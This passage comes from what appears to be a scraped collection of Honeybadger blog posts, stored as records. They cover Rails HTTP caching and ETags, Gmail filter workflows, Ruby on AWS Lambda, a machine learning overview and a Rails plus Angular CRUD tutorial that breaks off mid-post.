Header The main header we care about, as far as caching goes, is the Cache-Control header. This helps determine which machines can cache a response from our Rails server and when that cached data expire. Within the Cache-Control header, there are several fields, most of which are optional. We'll go through some of the most relevant entries here, but for more information, you can check the official HTTP spec at w3.org . Here's a sample from a basic out-of-the-box Rails response header: < Content-Type: text/html; charset=utf-8\n< Etag: W/\"b41ce6c6d4bde17fd61a09e36b1e52ad\"\n< Cache-Control: max-age=0, private, must-revalidate max-age The max-age field is an integer containing the number of seconds the response is valid. By default, a Rails response for a view will have this set to 0 (i.e., the response expires immediately, and the browser should always get a new version). public/private Including public or private in the header sets which servers are allowed to cache the response. If the header includes private , it is only to be cached by the requesting client (e.g., the browser), not any other servers it may have passed through to get there, such as content delivery networks (CDNs) or proxies. If the header includes public , then these intermediary servers are allowed to cache the response. Rails sets each header to private by default. must-revalidate Rails also sets the must-revalidate field by default. This means that the client must contact the server to confirm that its cached version is still valid before it is used. To determine whether the cached version is valid, the client and server use ETags. ETags ETags are an optional HTTP header added by the server when it sends a response to the client. Typically, this is some sort of checksum on the response itself. When the client (i.e., your browser) needs to request this resource again, it includes the Etag it received (assuming it has a previous response cached) in the If-None-Match HTTP header. The server can then respond with a 304 HTTP code (\"Not Modified\") and an empty body. This means the version on the server hasn't changed, so the client should use its cached version. There are two types of ETags: strong and weak (a weak tag is denoted with a W/ prefix). They behave the same way, but a strong ETag means the two copies of the resource (the version on the server and the one in the local cache) are 100% byte-for-byte identical. Weak ETags, however, indicate that the two copies may not be byte-for-byte identical, but the cached version can still be used. A common example of this is Rails' csrf_meta_tags helper, which creates a token that changes constantly; thus, even if you have a static page in your application, it will not be byte-for-byte identical when it's refreshed due to the Cross-Site-Request-Forgery (CSRF) token. Rails uses weak ETags by default. ETags in Rails Rails handles ETags automatically on views. It includes the ETag in outgoing headers and has middleware to check incoming ETag headers and returns 304 (Not Modified) codes when appropriate. Notably, however, because Rails generates views dynamically, it still has to do all the rendering work before it can figure out the ETag for that view. This means even if the ETags match, you are only saving the time and bandwidth it takes to send the data across the network, as opposed to something like view caching, where you can skip the rendering step completely if there's a cached version. However, Rails does provide a few ways to tweak the generated ETag. stale? One way to overcome the ever-changing CSRF token from changing the ETag is with the stale? helper in ActionController . This allows you to set the ETag (either strong or weak) directly. However, you can also simply pass it an object, such as an ActiveRecord model, and it will compute the ETag based on the object's updated_at timestamp or use the maximum updated_at if you pass a collection: class UsersController < ApplicationController def index @users = User . includes ( :posts ). all render :index if stale? ( @users ) end end By hitting the page with curl, we can see the results: # curl -I localhost:3000 -- first page load\nETag: W/\"af9ae8f2d66b9b6c4d0513f185638f1a\"\n# curl -I localhost:3000 -- reload (change due to CSRF token)\nETag: W/\"f06158417f290334f47ea2124e08d89d\"\n\n-- Add stale? to controller code\n\n# curl -I localhost:3000 -- reload\nETag: W/\"04b9b99835c359f36551720d8e3ca6fe\" -- now using `@users` to generate ETag\n# curl -I localhost:3000 -- reload\nETag: W/\"04b9b99835c359f36551720d8e3ca6fe\" -- no change This gives us more control over when the client has to download the full payload again, but it still has to check with the server every time to determine whether its cache is still valid. What if we want to skip that check altogether? This is where the max-age field in the header comes in. expires_in and http_cache_forever Rails gives us a couple of helper methods in ActionController to adjust the max-age field: expires_in and http_cache_forever . They both work how you would expect based on their names: class UsersController < ApplicationController def index @users = User . includes ( :posts ). all expires_in 10 . minutes end end # curl -I localhost:3000\nCache-Control: max-age=600, private Rails has set the max-age to 600 (10 minutes in seconds) and removed the must-revalidate field. You can also change the private field by passing a public: true named argument. http_cache_forever is mostly just a wrapper around expires_in that sets the max-age to 100 years and takes a block: class UsersController < ApplicationController def index @users = User . includes ( :posts ). all http_cache_forever ( public: true ) do render :index end end end # curl -I localhost:3000\nCache-Control: max-age=3155695200, public This kind of extremely-long-term-caching is why Rails assets have a \"fingerprint\" appended to them, which is a hash of the file's content and creating filenames, such as packs/js/application-4028feaf5babc1c1617b.js . The \"fingerprint\" at the end effectively links the contents of the file with the name of the file. If the content ever changes, the filename will change. This means browsers can safely cache this file forever because if it ever changes, even in a small way, the fingerprint will change; as far as the browser is concerned, it's a completely separate file that needs to be downloaded. Spheres of Influence Now that we've covered some caching options, my advice might seem a bit odd, but I suggest that you try to avoid using any of the methods in this article! ETags and HTTP caching are good to know about, and Rails gives us some specific tools for addressing specific problems. The caveat, though, and it's a big one, is that all of this caching happens outside your application and is, therefore, largely outside your control. If you are using view caching or low-level caching in Rails, as covered in earlier parts of this series, and encounter invalidation issues, you have options; you can touch models, push updated code, or even reach into Rails.cache directly from the console if you have to, but not with HTTP caching. Personally, I'd much rather have to run Rails.cache.clear in production than face an issue where the site is broken for users until they clear their browser cache (your customer service team will love you for it too). Conclusion This is the end of the series on caching in Rails; hopefully, it was useful and informative. My advice for caching continues to be as follows: do as little as you can, but as much as you have to. If you experience performance problems, start by looking for methods that are hit often; perhaps, they can be memoized. Need the value to persist across requests? Maybe that heavily-used method could use some low-level caching. Or, perhaps, it's not any particular method; it's just crunching through all those nested partials, which are slowing things down; in this case, maybe view level caching can help. Rails gives us the \"sharp knives\" to target each of these issues, and we just need to know when to use them.", "date": "2021-04-05"},
{"website": "Honey-Badger", "title": "3 Questions to Validate Your Product Idea", "author": ["Sophia Le"], "link": "https://www.honeybadger.io/blog/3-questions-to-validate-your-product-idea/", "abstract": "True story: Starr, Ben, and Josh built Honeybadger because they got angry. But that was just the beginning. They had to evaluate whether other people were angry and willing to pay for another solution. They had to assess whether they had the right people and funding streams. If you want to launch a product, here are three questions to ask yourself - and how Honeybadger used them to turn their idea into a profitable business. 1. Is there a pain point? Before Honeybadger started, the guys experienced the pain of a subpar error monitoring service. They wanted more context and data. When their provider offered little information, they channeled their frustration into building their error monitoring service. People get motivated to buy solutions that fix their problems. If your idea solves a pain point, then you may have the foundation for a profitable product. 2. Will customers pay money for it? In the past, developers relied on customers to tell them what went wrong on websites. The first error monitoring services automated that process, but the guys found they didn't offer the information necessary to resolve an error. Being developers themselves, they were sure others would pay for a solution that could. However, you may not be the target demographic of your proposed product idea. Determine your ideal customer and start talking to them! Run a survey, talk to your friends, or network at an industry conference. 3. Can you build the product within a reasonable of time? With the problem and market identified, the guys started building a minimum viable product. They kept their costs low through bootstrapping. Five months later, Honeybadger was open for business. To evaluate you can build your product in a reasonable amount of time, ask yourself: How much money and time do I have to invest? Who can help me build this product? Conclusion Sometimes, you have to iterate a few times to get it right. If you are seriously contemplating a product idea, use these three questions to guide you. Good luck!", "date": "2016-10-06"},
{"website": "Honey-Badger", "title": "Lessons from Rails Rumble", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/rails-rumble-2012-lessons/", "abstract": "We were very excited when we found out we would get to sponsor this year's Rails Rumble competition, and are proud of all the great contestants and new apps that they've built using our favorite web framework! There were a lot of entries, yet somehow I managed to look through them all on Sunday night. I was impressed with the problems many of the contestants were able to solve in just 48 hours, which makes me wonder what is possible for all of us in the coming year. I also took some notes on a few glitches I ran into, and I thought it would be useful for all of us if I share them. So here goes: Email address validation can be your enemy tl:dr : Email addresses have complex formats. It's often easier to deal with a few malformed addresses rather than risk alienating a section of your customer base. Like many other users, I like to keep track of emails from applications I'm evaluating. An easy way to do that is to append \"+app_name\" after the username of my email address, e.g., josh+railsrumble@honeybadger.io . GMail in particular will still route those emails to my inbox, but I can use that tag to track spam back to the culprit, or filter out unwanted emails (sub-tip: always provide an opt-out feature.) A problem I encountered on one RailsRumble entry - that I was particularly keen on test driving - was that when I entered my email address it wouldn't let me sign up, indicating that it was invalid. I quickly narrowed it down to the plus symbol, and after some internal debate over using my normal address or not, I closed the browser window. The moral of this story is that email addresses are complex animals, and most regular expressions used to evaluate them are far from perfect. I'd rather loosely validate the email address (by asserting the presence of an @ symbol, for example) and deal with the few malformed addresses that get through than lose potential customers entirely. Here's a less-stringent email regex that is included in the Devise initializer : `# Email regex used to validate email formats. It simply asserts that\n# an one (and only one) @ exists in the given string. This is mainly\n# to give user feedback and not to assert the e-mail validity.\n\n/\\A[^@]+@[^@]+\\z/\n` Login with what? tl:dr : I hate facebook, give me other options. It's no secret among my friends and colleagues that I am not the biggest Facebook fan. So when an app requires me to have a Facebook account in order to use it, I'm clicking the \"close\" button on my browser tab, perhaps after a mournful sigh if the app looks particularly interesting/fun/useful. It's too bad, because implementing a traditional email/password login option isn't that much extra work. If you're using OmniAuth for your Facebook integration, the Devise gem is a great addition to your Gemfile. Building is just the start tl:dr : Answer your customer support emails. One of my favorite entries had an apparent bug that prevented me from logging in with Github. I was seriously excited to use this app, and I still am, because I haven't heard back from their customer support. Here at Honeybadger, we do our best to maintain \"inbox zero\" in our Help Scout account. That means replying to your emails (and fixing your problems) as soon as we see them come in. To do that, we make sure our entire team is getting notifications. Our favorite way to consume notifications is through our Campfire room, which is usually occupied by one or more of our team. Monitor, monitor, monitor tl:dr : Use Honeybadger :). If you were starting a bakery, you would know immediately when a customer was banging on your front door because you forgot to unlock it. In the turbulent world of tech startups, however, you could lose thousands of customers before realizing something like over-ambitious email validation is preventing them from signing up. That's why it's important to monitor everything . Here at Honeybadger, we utilize many internal and external services to keep tabs on the health and growth of our applications, and the lifecycle of our users. This issue is near and dear to our hearts, and is one of the reasons we built Honeybadger in the first place.", "date": "2012-10-18"},
{"website": "Honey-Badger", "title": "Make Email Notifications Work For You", "author": ["Adam Dill"], "link": "https://www.honeybadger.io/blog/make-email-notifications-work-for-you/", "abstract": "Email is out of control. Newsletters, lists, financial transactions, errors and warnings all show up daily; and dealing with them individually takes a considerable amount of time. The amount of email I've had in my inbox has varied from dozens to hundreds. I can’t spend all day answering email, after all: I’ve got a business to run! Other than unsubscribing, the best way to handle this tsunami of information is to create a workflow in which you can address bulk categories of emails in a single pass. My strategy is to make it easier to take action on emails than let them sit in my inbox. The Tools Gmail provides tools to categorize and consume similar emails quickly. By utilizing filters and labels, you’ll get out of your inbox and back to work faster. Let’s look at how each tool works. Filters Filters are rules that all your incoming email gets passed through. A rule is essentially a search query, and any email that matches that search will then have actions applied to it. Using a filter lets you delete those emails you just can’t unsubscribe to, or automatically label emails of a particular type. Labels A label is a method of organizing your emails. They work like a folder, with the exception that an email can have multiple labels associated with it. You can even nest them! The two I use most often are \"Notifications\" and \"Reporting.\" I use the \"Notifications\" label for bulk messages, like those from Twitter or MailChimp. I use \"Reporting\" for anything that gives me numerical insights into my business, i.e., Baremetrics, Google Analytics, or server response times. The Technique First, divide up your incoming mail by types using filters, and conquer them by applying labels and actions automatically. You can do things like star, automatically archive, or forward a piece of mail. After you have this setup, you’ll be able to look in a label, skim through the topics and read what you need to. When you finish hit Mark all as read and move on to the next label. No more clicking through every single email. The Setup Create one label for each type of email list you are on, a \"Notifications\" label, and a \"Reporting\" label. To create a new label, look on the left bar of Gmail, hit More, scroll to the very bottom and click \"Create a new label.\" This view gives you the full interface so you can control nesting. Note that you’ll have the option of setting up a new label while creating a filter also. To create a filter, first, you’ll need to search in the top bar. Try some searches like the one in the Matches section in the examples below. Gmail has an excellent quick reference on the more advanced ways to search. After you have crafted a search that targets just the right emails, click the down arrow on the right of the search bar and select \"Create a Filter with this search.\" You can create a filter from any search! Next, you’ll decide what you want to do with the matching emails, and create your filter. Check out the examples below to see some familiar services leveraged with this system. Conclusion This workflow may seem like a lot of work to set up, but you’ll gain that time back in a day or so. Dealing with email can be a giant time-sink, especially when you are applying human reflexes to machine generated emails. I like to let the machines handle the triage for me, that way I can spend more time helping people learn awesome new skills with DailyDrip ! The Examples Automatically Delete all emails coming from a domain Matches: from:(*@example.com).\nDo this: Delete it. Email Lists Matches: to:(office@example.com).\nDo this: Skip Inbox, Apply label \"Office.\" I often create a label unique to an email list, this way I can deal with those emails at the proper time. Getting them out of the inbox removes the stress of reading them immediately, so I can scan through them when needed, and not have them interrupt me. It’s great to know that the monthly birthday party starts at 2 pm, or there are donuts in the breakroom. I don’t need to think about that in my first couple of hours of my day! This method keeps that noise to a minimum during my most productive hours. Special Case: Support emails. Matches: to:(support@DailyDrip.com).\nDo this: Mark it as important. I love talking to our customers, and given the number of emails we send at DailyDrip, most of that contact comes via through email support. I always want those marked important and DO NOT skip the inbox. I like to see these quickly so I can respond asap. Amazon Matches: from:(*@marketplace.amazon.com).\nDo this: Skip Inbox, Apply label \"Amazon.\" This method will filter off all those messages from independent sellers on Amazon asking for reviews after you buy a product, without stopping the shipping/delivery notifications. Baremetrics Matches: from:(hello@baremetrics.com).\nDo this: Skip Inbox, Apply label \"Reporting.\" I read our Baremetrics stats daily as part of my reporting sweep. Github Matches: to:(*@noreply.github.com).\nDo this: Skip Inbox, Apply label \"GitHub.\" Love me some GitHub, but I don’t need it in my inbox. Notice that this matches on the 'to' field, instead of the 'from' field. This way I can handle account notifications separately from PRs and comments on our code. Honeybadger Matches: from:(notifications@honeybadger.io).\nDo this: Skip Inbox, Apply label \"Reporting.\" Automatically put all your exceptions into a reporting label for later review. Hobbit Matches: from:(hobbit@example.com).\nDo this: Skip Inbox, Apply label \"Ops.\" I like to keep my server monitoring notifications separate from my application monitoring ones. This method makes tracking down problems a bit quicker during emergency downtimes, as there is fewer data to sort through. All my Hobbit and XYmon reports go to Ops. iTunes Connect & Apple reporting Matches: subject:(iTunes Connect).\nDo this: Skip Inbox, Mark as read. Matches: from:(do_not_reply@apple.com) subject:(Financial Report).\nDo this: Skip Inbox, Apply label \"Reporting.\" I just love that time of the month when iTunes Connect sends me one email per country that I’m selling in. I get that reporting done better through other applications, so I don’t even look at these emails usually. Logentries Matches: from:(alerts@logentries.com).\nDo this: Skip Inbox, Apply label \"Reporting.\" Log notifications for long running tasks are wonderful to know, and I look at the at the same time I do my daily exception browsing. Mailchimp Matches: subject:(New Subscriber to).\nDo this: Skip Inbox, Mark as read, Apply label \"Notifications.\" Matches: subject:(Unsubscribe from DailyDrip).\nDo this: Skip Inbox, Apply label \"Notifications.\" It’s great to keep an eye on your email lists, but when you are getting a lot of subscriptions this can be spammy! I mark new subscriptions as read, and just scan the dates, but like to keep an eye on unsubscriptions, so I manually mark them as read. Mandrill Matches: from:(noreply@mandrill.com).\nDo this: Skip Inbox, Apply label \"Reporting.\" I read our Mandrill stats weekly as part of my reporting sweep. Skylight Matches: from:(trends@skylight.io).\nDo this: Skip Inbox, Apply label \"Reporting.\" Skylight is great about giving weekly speed reports on our site; I check it with my usual reporting sweep. Sumome Matches: from:(support@sumome.com).\nDo this: Skip Inbox, Apply label \"Reporting.\" I read our Sumo Me stats weekly as part of my reporting sweep. Twitter Matches: via Twitter.\nDo this: Skip Inbox, Apply label \"Notifications.\" Twitter Mentions and DMs don’t need to be in my inbox every 30 seconds. Testflight Matches: subject: TestFlight.\nDo this: Skip Inbox, Apply label \"TestFlight.\" I’m on so many beta versions of apps distributed through TestFlight that the emails hampered my productivity. Sometimes I got over 10 of these emails a day! I like knowing new releases are available, especially when I’m working on an app, but rarely does that need immediate attention.", "date": "2016-08-23"},
{"website": "Honey-Badger", "title": "Honeybadger Has Joined Forces With GitHub Student Developer Pack!", "author": ["Ben Findley"], "link": "https://www.honeybadger.io/blog/honeybadger-has-joined-forces-with-github-student-developer-pack/", "abstract": "Here at Honeybadger, we want to do our part to help student developers keep their apps free from errors. That’s why we are excited to offer our error monitoring, uptime and check-in monitoring tool free of charge to students that take advantage of the GitHub Student Developer Pack. The GitHub Student Developer Pack is a centralized marketplace for students to get free access to pro-level developer tools so they can get hands-on experience with the same tools they will be using on the job. We are offering our Small plan free of charge for 12 months for students which features: 225,000 Error limit 60 days retention 60 uptime checks 120 check-ins Unlimited users Unlimited apps See the full list of features here If you are a current student you can see our offer here or you can sign up on GitHub’s Student Developer Pack website to get verified and access all the cool free tools. We’re excited to see what new technologies will come to the market in the coming years! Happy coding!", "date": "2019-09-19"},
{"website": "Honey-Badger", "title": "Using Ruby on AWS Lamba", "author": ["Benjamin Curtis"], "link": "https://www.honeybadger.io/blog/using-ruby-on-aws-lamba/", "abstract": "When Ruby support on AWS Lambda was announced yesterday, I was so\nexcited about it that I had to try it right away. We've been using\nLambda for a while at Honeybadger, and I have longed to be able to write\nour functions in Ruby. Having played with the new Ruby support for a few\nhours, I'm feeling confident we'll be spending less time with Node, Go,\nand Python. :) A Quick Example While the announcement blog post from AWS can get you up and running\nquickly with Ruby on Lambda, I wanted to share an example of using the Serverless framework to deploy your Ruby Lambda functions. I've found\nthis framework does a fantastic job of removing the annoyances of\nworking with Lambda functions. While the current version (1.34) of the\nframework doesn't have template generation for Ruby projects ready yet\n(the PR was merged a couple of hours before I started writing this\npost), it's easy enough to get started without the generator. Here's a\nsample config file that I'll use for this walkthrough, which is a simple\nfunction that will populate a DynamoDB table with metadata associated\nwith S3 objects when they are created: The resources section of the config results in the automatic creation of\na new DynamoDB table, and the name of the newly-created table is placed\nin the an environment variable for the function, which we'll use in the\ncode.  The function is triggered by SNS events for an SNS topic that has\nbeen created previously. That SNS topic receives notifications for PUT\nevents on the S3 bucket, which is also created manually. Here's the Ruby code: The code doesn't do a whole lot -- it receives SNS events, loops\nthrough the records in the SNS messages to get the info about each S3\nobject that was created, performs a HEAD request on the S3 object\nto get the metadata, then puts (creates or updates) an item in the\nDynamoDB table. The only dependency for this function is the AWS SDK,\nwhich is included in the runtime environment, so you don't even need to\nworry about a Gemfile. However, if you do have some additional gems\nyou'd like to bring to the party, that's easy to do. Let's take a look\nat how to include additional gems as we talk about deployment. Deployment Getting this code in its current state to Lambda is super easy, thanks\nto the Serverless framework: sls deploy That one command will do all of this for you: Zip up your code Put the zip file onto S3 Deploy the function in Lambda (complete with environment variables and SNS trigger) Create the IAM policies Create the DynamoDB table Once the deployment is done, creating objects in the bucket will result in new items\nbeing added to the DynamoDB table. Dependencies Getting additional gem dependencies included with your deployed function\nis easy -- all you need to do is create a Gemfile, add the gems you want\nto bundle, and run bundle install --path vendor/bundle . This will\nbundle the gems into the local directory, and they will get zipped up\nand added to the function with the rest of your code. The one caveat for dependencies, though, are gems that require some sort\nof C extension to be compiled. Since your development environment is\nmost likely different from the Lambda runtime environment, you need to\ndo a little more work to get those extensions compiled to work in AWS.\nThanks to the lambci Docker images , though, and the Docker image I\ncreated on top of their Ruby image, it's not hard to do. To bundle your\ndependencies and have them compiled properly, just run my docker image ,\nlike so: docker run --rm -v $(pwd):/var/task stympy/lambda-ruby2.5 All it does is run the bundler command line mentioned above, so the gems\nwill be placed in vendor/bundle , ready to be included in the ZIP file\nthat is created by the deploy command. With that, you're off to the races. I hope you'll enjoy running Ruby in\nLambda as much I have. :)", "date": "2018-11-30"},
{"website": "Honey-Badger", "title": "ElixirConf 2016 Ticket Giveaway", "author": ["Sophia Le"], "link": "https://www.honeybadger.io/blog/elixirconf2016-ticket-giveaway/", "abstract": "It's no secret: We at Honeybadger are crazy about Elixir. We were the first error monitoring service to support Elixir. We had a blast sponsoring and attending ElixirConf 2015. But this year, we want to share the fun with one of you. Therefore, we are giving away a free ticket to ElixirConf 2016! The conference is a great opportunity if you want to learn more about Elixir and Phoenix, expand your network, or have an excuse to go to Disney World afterwards (We won't judge). For more information on what you're in store for, visit www.elixirconf.com. Enter the giveaway here . Note that this giveaway is for a conference ticket. Other expenses such as airfare, hotel, and conference training not included. Additional terms and conditions may apply. Giveaway ends on August 1st, 2016. We will announce the winner during the first week of August. Good luck to all!", "date": "2016-07-26"},
{"website": "Honey-Badger", "title": "Why Every Web Developer Should Explore Machine Learning", "author": ["Julie Kent"], "link": "https://www.honeybadger.io/blog/machine-learning-for-web-developers/", "abstract": "I don't have kids yet, but when I do, I want them to learn two things: Personal finance Machine learning Whether or not you believe that the singularity is near, there's no denying that the world runs on data. Understanding how that data is transformed into knowledge is critical for anyone coming of age these days – and even more so for developers. This is the first article in a series that will attempt to make machine learning (ML) accessible to full-stack Ruby developers. By understanding the ML tools at your disposal, you'll be able to help your stakeholders make better decisions. Future articles will focus on individual techniques and practical examples, but in this one, we're setting the stage – showing you a map and placing a pin that says \"you are here.\" Humble Beginnings Artificial intelligence (AI) and machine learning are nothing new. Back in the 1950s, Arthur Samuel built a computer program that could play checkers. He used \"alpha-beta pruning\" – a common search algorithm. The 1960s saw the advent of multi-layered neural networks and the nearest-neighbor algorithm, which is used to find optimal pathing in warehouses. So if AI is so old, why are AI startups so trendy? In my opinion, there are two reasons for this: Computing power (see Moore's Law ) The amount of data being added to the internet every day There are two statistics related to the amount of data being created on a daily basis that blow my mind every time I think about them: As of 2018, we are producing 2.5 quintillion bytes of data every day. No doubt this number has only increased since this Forbes article was published. Over the last two years alone, 90% of the data in the world was generated. Together, what this means is that (1) the hardware necessary to store data and run algorithms continues to become more affordable and (2) the amount of data available to train the ML models is increasing at a crazy-fast pace. Every day we are interacting with, being influenced by, and contributing to the world of artificial intelligence and machine learning. For example, you can thank (or blame) algorithms for the following: Your credit line Helping diagnose illness Maybe even whether or not you got the job Helping you find the most efficient route given current traffic conditions Alexa understanding exactly what you mean when you tell her you just sneezed Spotify introducing you to your new favorite song The reason I brought up my hypothetical future kids is this: I want them to understand how their digital lives influence their \"real\" lives, the implications of their data privacy decisions, and how to form their own opinions of when they should trust the machine vs. when they shouldn't. In the remainder of this post, I want to give an overview of the three kinds of machine learning that I've studied: supervised learning, unsupervised learning, and reinforcement learning. We'll talk about what makes each approach unique and the problems each is especially good at solving. Supervised Learning Supervised learning is... well, supervised by humans. :) Imagine that we're building a supervised learning system to decide who gets approved for a mortgage. Here's how it might work: The bank compiles a dataset that maps customer attributes (age, salary, etc.) to outcomes (repayment, default, etc.). We train our system using the data. The system uses what it learns to guess future outcomes based on an applicant's attributes. If the algorithm guesses correctly, we tell it, \"Great job! You're right.\" But if it's wrong, we tell it, \"No, you're incorrect. Please improve and try again.\" This example is considered a \"classification\" problem because the output of the algorithm is a category – in this case, approved or not approved. Other examples of classification problems include deciding whether or not: a person has an illness an x-ray has a broken bone an e-mail is spam If you're curious to learn more about the math behind ML classification algorithms, Google any of these: naive Bayes classifiers, support vector machines, logistic regression, neural networks, random forests. In addition to classification problems that render a \"yes/no\" outcome, supervised learning can also be utilized to solve regression problems – here, we make a prediction on a continuous scale, for example: the future value of a stock the probability that the New England Patriots win the Super Bowl the average salary a company needs to offer a candidate for them to accept Examples of algorithms used for supervised regression problems include linear regression, non-linear regression, and Bayesian linear regression. Unsupervised Learning With our supervised learning example, we predefined the classification categories. The mortgage applicant was either approved or denied. With unsupervised learning, we don't provide the categories. They're not available to us. The algorithm must come up with its own conclusions. Why would we want to use an unsupervised approach? 1) Sometimes we don't know categories beforehand. Much of the data floating around the internet is unstructured – i.e., lacking labels. 2) Other times, we don't know what we're looking for, so we can ask the algorithm to find patterns/features that can be useful for categorization. Another way to handle unstructured data with machine learning is to simply have humans look at it and manually label it. There are lots of companies that hire workers to manually classify data: labeling data . Approaches to Unsupervised Learning Two techniques that are commonly used in unsupervised learning are association and clustering . Association: Imagine that you're Amazon. You have a lot of customer data, purchase history, etc. By using unsupervised learning, you could partition customers into \"types of shoppers\" – maybe figuring out that those who buy pink umbrellas are more likely to also purchase Matcha tea. Clustering: Clustering looks at your data and partitions it into a specified number of groups, or clusters. For example, maybe you have a bunch of housing data and you want to see if there are any features (possibly crime data?) that can predict what neighborhood the home is in. Or, techniques like cosine similarity can be used for text classification (e.g., is this article about tennis, cooking, or space?). If you're interested in learning more about specific unsupervised learning techniques, Google search k-means clustering, cosine similarity, hierarchical clustering, and k-nearest-neighbor clustering. Reinforcement Learning This subset of machine learning is commonly used in games because it utilizes goal-oriented algorithms. Unlike supervised learning, each decision is NOT independent – given a current input, the algorithm makes a decision and the next input depends on this decision . Just like I give my dog a pat on the head when he stops incessantly barking when the doorbell rings or put him in his kennel when he won't shut up, reinforcement algorithms are rewarded when making a goal-optimizing decision (e.g., scoring the max number of points) and penalized when making a poor one. The obvious applications for reinforcement learning algorithms include: games like chess and Go (I highly recommend the AlphaGo documentary on Netflix, if you haven't seen it already.) robotics (teaching bots to complete desired tasks) autonomous vehicles robo-advisors that are trained to beat the stock market If you're interested in learning more about the algorithms behind reinforcement learning, Google search Q-learning, state-action-reward-state-action (SARSA), DQN, and the asynchronous advantage actor critic. Conclusion I hope that these examples have helped you gain a grasp on machine learning techniques and how each is used to influence the crazy world we live in today. While I sometimes find myself overwhelmed with all that there is to learn, starting somewhere is better than doing nothing, and remember that much of this is actually not very new at all – we are just hearing about it more as data becomes more available and processing power cheaper.", "date": "2020-03-18"},
{"website": "Honey-Badger", "title": "Using Angular with Rails 5", "author": ["Julio Sampaio"], "link": "https://www.honeybadger.io/blog/angular-rails-5/", "abstract": "You’ve heard the story before. You already have an application running upon your decentralized and fully-working back-end APIs and a front-end made with any ordinary toolset. Now, you want to move on to Angular. Or, perhaps you’re just looking for a way to integrate Angular with your Rails projects because you prefer things this way. We don’t blame you. With such an approach, you can take advantage of both worlds and decide whether you want to use features from Rails or Angular to format stuff, for example. What We'll Build There’s no need to worry. This tutorial was written for this purpose. We’ll dive into the creation of a fully-working CRUD application over a domain of users. At the end of the article, you will have learned some basic concepts around Angular and how to set up a Rails back-end project that directly integrates with Angular for the front-end, as shown below: CRUD of users made with Rails and Angular The application will handle all four CRUD operations over the domain of users retrieved from an external fake-testing web service. The app will be built on top of an MVC architecture, with each Angular layer explained in detail to help you better understand how things tie together. The style is up to Bootstrap. Setup As you may have guessed, we will need the following software: Ruby (I’ve picked the version 2.7.0preview1), Ruby and Rails (I’m using its version 5.0.7.2), Node.js (I’m going with v13.7.0), Yarn (At least its version 1.22.4) Make sure to get everything installed properly. Then, we can move on to the project. Select a folder of your preference and run the following command: rails new crud-rails-angular Wait for the setup to complete and open the project within your favorite IDE. We’re going to work with VS Code for this article because it’s simple, powerful, and smoothly embraces both Rails and Angular syntaxes. If you’ve been using Rails 5 for a while, you may have noticed that its new command generates a bug within the Gemfile for the SQLite config. It comes without a minimum version, and that will make it run with errors. Let’s fix this problem by updating it to gem 'sqlite3' , '~> 1.3.10' Perfect! Webpacker Setup The best way to manage JavaScript-like applications in Rails is through Webpacker . It makes use of Webpack behind the scenes to provide features, such as pre-processing and bundling JavaScript apps, like Angular, into an existing Rails application. To install it, just add a new line to your Gemfile : gem 'webpacker' , '~> 4.3.x' This will assure that you’ll install a very recent version. Next, run the following commands: bundle install bundle exec rake webpacker:install\nbundle exec rake webpacker:install:angular The first command will download and update the added Rails dependencies. The second is the equivalent to npm install since it creates the node_modules folder and installs a bunch of required Angular dependencies, such as Babel, Sass, Browserlist, and Webpack. Now, we have both a Node and a Rails app in the same project. In the latest command, we have the equivalent of npm install angular , which will download all the Angular-required dependencies and make it work alongside our Rails project. At the end of these commands, you can also see the package.json file created. All of our required dependencies are placed there, and you can add whichever you need in the future. Also, some folders and files were created under the /app folder, such as the new /javascript . In this folder, you already have a /hello_angular folder created to support the beginning of your development. To gain some time, I’ll ask you to mirror your folders and files structure with the following one: Some Angular Adjustments Webpacker recommends a series of adjustments within your generated Rails project. So, let’s take some time to organize the house. First, open your application.js file placed under the /packs folder (shown in the figure above) and add the following code: import \" core-js/stable \" ; import \" regenerator-runtime/runtime \" ; These imports work as an auxiliary force to stabilize the JavaScript environment within the Rails project. Now, we need to inform Rails from where it must pick the output to its pages. Once Webpacker finishes packing things up, it’ll generate a bunch of distributable static files that Rails must be aware of. Go to the application.html.erb file under the app/views/layout folder and change its &lt;head> tag content to the following: <head> <title> CrudRailsAngular </title> <base href= \"/\" /> <!-- 1 --> < %= csrf_meta_tags % > < %= stylesheet_link_tag ' application ', media: ' all ', ' data-turbolinks-track ' : ' reload ' % > <link rel= \"stylesheet\" href= \"https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css\" integrity= \"sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z\" crossorigin= \"anonymous\" /> <!-- 2 --> < %= javascript_include_tag ' application ', ' data-turbolinks-track ' : ' reload ' % > < %= javascript_pack_tag ' application ' % > <!-- 3 --> </head> Let’s break this down a bit: Here, we’re adding the base tag, which tells Rails where to look when the application starts up. We’ll make use of Bootstrap to infer style to the page, so we can focus on the implementation only. Here is where you must place the Webpacker tag that maps to the /packs folder content (the same that will be auto-generated by Webpacker after every compilation). Model and Database Move on to the database setup. To make things faster, we’ll scaffold a new model called User . This is the command you must run to achieve it: rails g scaffold User name:string age:integer address:text && rake db:migrate It’ll create all of our model’s folders and files, which we will need to make Rails manipulate database information (from SQLite) and store it to our CRUD operations. Then, you will see that a new file XXX1_create_users.rb was created under the db/migrate/ folder. Open it, and you'll see the newly created CreateUsers record. Within the app/models/ folder, you will see the then-created User model at the user.rb file. Now, open the db/seeds.rb file and add the following code: User . create ( name: 'Luke Wan' , age: 23 , address: '123 Test St.' ) User . create ( name: 'Mary Poppins' , age: 41 , address: '123 ABC St.' ) User . create ( name: 'John Neilman' , age: 76 , address: '000 Test St.' ) This code will initialize our Users table with some data at startup. Save it, and run the command: rake db:seed This will seed the table through the commands listed above. Next, you can enter the SQLite database and check if that worked by issuing the command: sqlite3 db/development.sqlite3 Then, select the table data: select * from users ; and you may see the results. The User Component You will need to install a couple more of the dependencies to help with the conversion of HTML and CSS to our Rails pages; add the Angular router, forms libs, and ngx-bootstrap , which we’ll use to facilitate the creation and manipulation of Bootstrap components. So, issue the following command: yarn add @angular/router @angular/forms html-loader css-loader ngx-bootstrap However, before we jump into the component code, there are some important concepts we need to point out, starting with the anatomy of an Angular component. What is a Component? In Angular, a component exists to connect your views with the application logic made in TypeScript. In other words, a component is like a container for all the logic that your views need to support its functioning. It defines the values that the views will present and controls their flows. It's the equivalent of a ‘controller’ in similar frameworks. To create a component, all you need to do is define a new class, implement the OnInit interface, and annotate the class with the @Component decorator: export class UserIndexComponent implements OnInit { constructor () { ... } ngOnInit () { ... } } 